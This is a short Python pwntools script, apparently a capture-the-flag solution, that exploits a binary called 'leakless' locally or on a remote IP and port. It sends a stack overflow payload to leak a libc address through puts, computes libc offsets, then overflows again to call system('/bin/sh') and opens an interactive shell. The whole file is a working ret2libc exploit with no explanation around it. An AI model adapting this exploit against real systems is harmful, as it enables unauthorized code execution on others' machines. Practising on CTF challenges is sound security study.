#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./leakless"
elf=ELF(pwn_file)

libc=elf.libc

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("35.243.188.20", 2002)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

payload  = 'a'*0x48 + 'a'*0x4 + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['__libc_start_main'])
r.sendline(payload)
libc_start_main = u32(r.recv(4))
info("libc_start_main: %16x",libc_start_main)
setvbuf = u32(r.recv(4))
info("setvbuf: %16x",setvbuf)

'''
search in libc database
'''
libc_start=0x018890
libc_base = libc_start_main - libc_start
system  = 0x03d540 + libc_base
binsh = 0x1794d1 + libc_base

info("libc load: %16x",libc_base)

payload2 = 'a'*0x48 + p32(0) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload2)
r.interactive()
